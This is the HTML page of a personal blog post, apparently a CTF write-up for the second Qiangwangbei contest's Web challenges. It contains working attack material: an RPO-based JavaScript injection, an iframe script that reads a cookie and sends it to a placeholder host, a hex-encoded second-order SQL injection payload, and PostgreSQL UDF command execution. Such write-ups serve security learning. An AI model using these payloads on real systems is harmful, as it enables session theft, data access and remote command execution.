@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      第二届强网杯 Web/Crypto writeup | HeartSky&#39;s blog 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="HeartSky">
+    
+    
+
+    <meta name="description" content="WEBweb签到一共三关前面两关是MD5函数不能处理数组以及0e弱类型比较的问题第三关123if((string)$_GET[&apos;param1&apos;]!==(string)$_GET[&apos;param2&apos;] &amp;amp;&amp;amp; md5($_GET[&apos;param1&apos;])===md5($_GET[&apos;param2&apos;]))&amp;#123;   die(&quot;success!&quot;);&amp;#125; 找到两个MD5值一样的字符串">
+<meta name="keywords" content="writeup,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第二届强网杯 Web&#x2F;Crypto writeup | HeartSky&#39;s blog">
+<meta property="og:url" content="http://heartsky.info/2018/03/27/第二届强网杯-Web-Crypto-writeup/index.html">
+<meta property="og:site_name" content="HeartSky&#39;s blog">
+<meta property="og:description" content="WEBweb签到一共三关前面两关是MD5函数不能处理数组以及0e弱类型比较的问题第三关123if((string)$_GET[&apos;param1&apos;]!==(string)$_GET[&apos;param2&apos;] &amp;amp;&amp;amp; md5($_GET[&apos;param1&apos;])===md5($_GET[&apos;param2&apos;]))&amp;#123;   die(&quot;success!&quot;);&amp;#125; 找到两个MD5值一样的字符串">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/QWB/20180327000044_7pgkxf_Screenshot.jpeg">
+<meta property="og:updated_time" content="2018-03-27T09:05:08.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第二届强网杯 Web&#x2F;Crypto writeup | HeartSky&#39;s blog">
+<meta name="twitter:description" content="WEBweb签到一共三关前面两关是MD5函数不能处理数组以及0e弱类型比较的问题第三关123if((string)$_GET[&apos;param1&apos;]!==(string)$_GET[&apos;param2&apos;] &amp;amp;&amp;amp; md5($_GET[&apos;param1&apos;])===md5($_GET[&apos;param2&apos;]))&amp;#123;   die(&quot;success!&quot;);&amp;#125; 找到两个MD5值一样的字符串">
+<meta name="twitter:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/QWB/20180327000044_7pgkxf_Screenshot.jpeg">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          在渗透之路上渐行渐远
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">第二届强网杯 Web/Crypto writeup</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2018-03-27" class="post-meta__date date">2018-03-27</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/CTF/">CTF</a>, <a class="tags-link" href="/tags/writeup/">writeup</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><p>一共三关<br>前面两关是MD5函数不能处理数组以及0e弱类型比较的问题<br>第三关<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((string)$_GET[<span class="string">'param1'</span>]!==(string)$_GET[<span class="string">'param2'</span>] &amp;&amp; md5($_GET[<span class="string">'param1'</span>])===md5($_GET[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"success!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>找到两个MD5值一样的字符串<br><a href="https://www.mscs.dal.ca/~selinger/md5collision/" target="_blank" rel="external">https://www.mscs.dal.ca/~selinger/md5collision/</a></p>
+<p>简单扩展下 md5 的哈希过程<br>这里我用 ppt 画了一个图方便理解<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/QWB/20180327000044_7pgkxf_Screenshot.jpeg" alt=""><br>明文进行 64 bit 的分组，不足则进行 padding，这里的 s0 和函数 f 都是固定的，第一次就是利用函数 f 把第一个分组 m0 和初始化向量 s0 作为输入，得到输出 s1，依次类推，最后得到的 s6，也就是哈希后的结果，即图中的 enc</p>
+<p>最后一关就是 05 年王小云提出的 md5 哈希碰撞，也就是图中左上角的式子，对于两个不同的消息分组 M、N，s 相同，经过两次 f 函数后得到的结果是一样的，前面的消息分组对应图中的 m2，也就是虽然 m2、m3 不同，但是最后两次 f 函数后的 s4 是相同的，即最后哈希结果相同</p>
+<h3 id="share-your-mind"><a href="#share-your-mind" class="headerlink" title="share your mind"></a>share your mind</h3><p>前端后端对解析差异的问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/969/..%2f..%2f..%2f..%2findex.php/add</span><br></pre></td></tr></table></figure></p>
+<p>对于这个 url，nginx 和 apache 的解析是不同的，apache 是把 <code>..%2f..%2f..%2f..%2findex.php</code> 当做一层路径，而 nginx 会先进行 url 解码，即 <code>/index.php/view/article/969/../../../../index.php/add</code>，最后也就是 <code>/index.php/add</code></p>
+<p>然后注意到 <code>/index.php/add</code> 是会在相对路径下引入 <code>../static/js/jquery.min.js</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;../static/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>对于这个引入，前端实际引入的 url 路径是 <code>index.php/view/article/969/..%2f..%2f..%2f..%2findex.php/../static/js/jquery.min.js</code><br>前端浏览器不会进行路径的 url 解码，所以最后的路径是 <code>index.php/view/article/969/static/js/jquery.min.js</code></p>
+<p>后端是正则匹配来解析，导致匹配到 <code>index.php/view/article/969</code> 时就返回了页面内容，也就是实际引入的是我们写入的文章</p>
+<p>然后发布文章处就可以写入任意 js 了，为了避免后台过滤踩坑，直接用这种<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 108, 111, 99, 97, 116, 105, 111, 110, 61, 34, 104, 116, 116, 112, 58, 47, 47, 98, 97, 105, 100, 117, 46, 99, 111, 109, 34))</span><br></pre></td></tr></table></figure></p>
+<p><code>eval</code> 替换为 <code>document.write</code> 也是可以的<br>打到 cookie 提示是在某个子页面的 cookie 里</p>
+<p>这里就涉及到另一个知识点了<br>我们知道对于 url 来说，同源策略要求域名、协议、端口完全相同。而 cookie 也是有同源策略的，不同的是 cookie 的同源策略仅以域名、路径作为识别依据。所以不同路径下 cookie 是不一样的，因此问题就是如何获取子域的 cookie，这里采用了 iframe<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var i=document.createElement(&quot;iframe&quot;);</span><br><span class="line">i.src=&quot;/QWB_fl4g/QWB/&quot;;</span><br><span class="line">i.id=&quot;a&quot;;</span><br><span class="line">document.body.appendChild(i);</span><br><span class="line">i.onload = function ()&#123;</span><br><span class="line">  	var c=document.getElementById(&apos;a&apos;).contentWindow.document.cookie;</span><br><span class="line">	location.href=&quot;http://xxxxx?xx=&quot;+c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>用 iframe 引入了一个子页面，然后读取它的 cookie<br>最后 flag 就在 cookie 里</p>
+<p><a href="http://blog.nsfocus.net/rpo-attack/" target="_blank" rel="external">RPO攻击技术浅析</a></p>
+<h3 id="three-hint"><a href="#three-hint" class="headerlink" title="three hint"></a>three hint</h3><p>二次注入<br>注册后登录会查询和你年龄相同的用户名并输出出来<br>猜测大概是这么写的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$res = $conn-&gt;query(&quot;SELECT * FROM test2 WHERE user=&apos;$user&apos;&quot;);</span><br><span class="line">$age = $res-&gt;fetch_assoc()[&apos;age&apos;];</span><br><span class="line"></span><br><span class="line">$sql = &quot;SELECT * FROM test2 WHERE age=$age limit 1&quot;;</span><br><span class="line">$res = $conn-&gt;query($sql);</span><br><span class="line">$row = $res-&gt;fetch_assoc();</span><br><span class="line">echo &apos;Hi &apos;.$user.&apos;, your age is &apos;.$age.&apos; years old. The same age with you is &apos;.$row[&apos;user&apos;];</span><br></pre></td></tr></table></figure></p>
+<p>在注册时对于年龄只验证是否为数字，用 16 进制就可以把原始数据存入数据库，比如这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into test2 values(1, 0x3120616e6420313d3020756e696f6e2073656c65637420342c2873656c65637420646174616261736528292923);</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test2;</span><br><span class="line">+------+-----------------------------------------------+</span><br><span class="line">| user | age                                           |</span><br><span class="line">+------+-----------------------------------------------+</span><br><span class="line">| 1    | 1 and 1=0 union select 4,(select database())# |</span><br><span class="line">+------+-----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p>然后在根据年龄查询相同用户名的时候用的就是数据库里的”脏”数据，最终导致了 sql 注入</p>
+<h3 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h3><p>正解是 Apache Shiro Java 反序列化漏洞，但是 payload 不能直接打，要做修改，参照 orange 的<a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html?m=1" target="_blank" rel="external">文章</a></p>
+<p>我对 java 不是很熟悉，这里是用了另一个漏洞</p>
+<p>扫描端口发现 postgresql 服务开放<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE    SERVICE</span><br><span class="line">22/tcp   open     ssh</span><br><span class="line">42/tcp   filtered nameserver</span><br><span class="line">135/tcp  filtered msrpc</span><br><span class="line">139/tcp  filtered netbios-ssn</span><br><span class="line">445/tcp  filtered microsoft-ds</span><br><span class="line">593/tcp  filtered http-rpc-epmap</span><br><span class="line">1027/tcp filtered IIS</span><br><span class="line">1028/tcp filtered unknown</span><br><span class="line">1068/tcp filtered instl_bootc</span><br><span class="line">3128/tcp filtered squid-http</span><br><span class="line">4444/tcp filtered krb524</span><br><span class="line">5432/tcp open     postgresql</span><br><span class="line">5800/tcp filtered vnc-http</span><br><span class="line">5900/tcp filtered vnc</span><br><span class="line">6669/tcp filtered irc</span><br><span class="line">8009/tcp open     ajp13</span><br><span class="line">8080/tcp open     http-proxy</span><br></pre></td></tr></table></figure></p>
+<p>存在 postgresql 未授权访问漏洞，使用默认用户 postgres 密码为空可直接进入数据库</p>
+<p>列目录有限制，只能是当前目录，这基本就是 udf 提权了</p>
+<p>在当前目录发现了一些别人写进来的 .so 文件，那我们直接用就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE FUNCTION sys_eval()  RETURNS text AS  &apos;./udf.so&apos; LANGUAGE C STRICT;</span><br><span class="line">select sys_eval(&apos;ls /&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>关于 udf 提权，<a href="http://www.91ri.org/6507.html" target="_blank" rel="external">参考文章</a></p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>占坑</p>
+
+  </section>
+
+  
+  
+</article>
+
+
+            <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer class="footer">
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
+</footer>
+
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
